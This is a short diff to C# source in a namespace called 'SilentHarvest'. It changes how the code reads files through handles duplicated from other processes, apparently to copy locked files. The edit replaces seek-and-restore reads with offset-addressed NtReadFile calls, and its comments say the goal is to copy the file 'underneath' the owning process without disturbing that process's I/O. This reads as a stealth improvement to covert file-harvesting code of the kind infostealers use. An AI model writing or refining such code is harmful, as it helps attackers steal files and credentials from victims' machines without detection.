@@ -270,11 +270,10 @@ namespace SilentHarvest
                             long size = Native.GetFileSize(dup, out hi);
                             if (hi != 0 || size <= 0 || size > 96 * 1024 * 1024) continue;
 
-                            // the pointer lives in the shared FILE_OBJECT; save it,
-                            // read from 0, then restore so the owner stays consistent
-                            long savedPos = 0, tmpPos;
-                            Native.SetFilePointerEx(dup, 0, out savedPos, 1); // FILE_CURRENT
-                            Native.SetFilePointerEx(dup, 0, out tmpPos, 0);   // FILE_BEGIN
+                            // offset-addressed reads: never touch the shared
+                            // FILE_OBJECT's CurrentByteOffset, so the owning
+                            // process's I/O stays perfectly consistent while
+                            // we copy the file underneath it (no seek race)
                             byte[] data = new byte[size];
                             uint totalRead = 0;
                             byte[] chunk = new byte[1 << 20];
@@ -282,13 +281,15 @@ namespace SilentHarvest
                             while (totalRead < size)
                             {
                                 uint want = (uint)Math.Min((long)chunk.Length, size - totalRead);
-                                uint gotR;
-                                if (!Native.ReadFile(dup, chunk, want, out gotR, IntPtr.Zero) || gotR == 0)
-                                { ok = false; break; }
+                                long roff = totalRead;
+                                var iosb = new Native.IO_STATUS_BLOCK();
+                                int ntst = Native.NtReadFile(dup, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
+                                    ref iosb, chunk, want, ref roff, IntPtr.Zero);
+                                uint gotR = (uint)iosb.Information.ToInt64();
+                                if (ntst < 0 || gotR == 0) { ok = false; break; }
                                 Buffer.BlockCopy(chunk, 0, data, (int)totalRead, (int)gotR);
                                 totalRead += gotR;
                             }
-                            Native.SetFilePointerEx(dup, savedPos, out tmpPos, 0); // restore
                             if (ok) result = data;
                         }
                         finally { Native.CloseHandle(dup); }
